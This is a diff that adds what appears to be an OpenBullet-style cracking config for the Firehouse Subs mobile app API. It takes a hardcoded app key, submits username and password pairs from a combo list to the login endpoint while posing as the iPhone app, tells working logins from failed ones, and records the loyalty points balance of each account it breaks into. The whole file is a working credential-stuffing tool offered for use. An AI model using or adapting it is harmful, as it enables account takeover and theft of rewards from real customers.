@@ -1,0 +1,71 @@
+[SETTINGS]
+{
+  "Name": "Firehousesubs.com",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2020-04-26T10:19:54.9987817-04:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Alphalete#4827",
+  "Version": "1.2.1",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://alapp.relevantmobile.com/api/v1/keychain/generate?appkey=7cZDrHfD8eMYITQu" 
+  
+  HEADER "User-Agent: Firehouse Subs/3.6.2 (iPhone; iOS 13.3.1; Scale/3.00)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "e\":\"" "\"" -> VAR "Key" 
+
+REQUEST POST "https://alapp.relevantmobile.com/api/vncr/user/onlineorder/customer_connect" 
+  CONTENT "longitude=-1&connect_type=2&latitude=1&keychain=<Key>&os=13.3.1&password=<PASS>&device_token=111157da27641111123d111a1111198cda111472f7bd111185ba6118db721111&register_type=1&appkey=7cZDrHfD8eMYITQu&email=<USER>&sign_in_device_type=iphone&phone_model=iPhone 8 Plus" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Firehouse Subs/3.6.2 (iPhone; iOS 13.3.1; Scale/3.00)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "{\"status\":true,\"" 
+  KEYCHAIN Failure OR 
+    KEY "{\"status\":false,\"" 
+
+PARSE "<SOURCE>" LR "n\":\"" "\"" -> VAR "Token" 
+
+REQUEST GET "https://alapp.relevantmobile.com/api/vncr/bonusplan?appkey=7cZDrHfD8eMYITQu&auth_token=<Token>" 
+  
+  HEADER "User-Agent: Firehouse Subs/3.6.2 (iPhone; iOS 13.3.1; Scale/3.00)" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "points\":" "," CreateEmpty=FALSE -> CAP "Points" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "points\":0" 
+
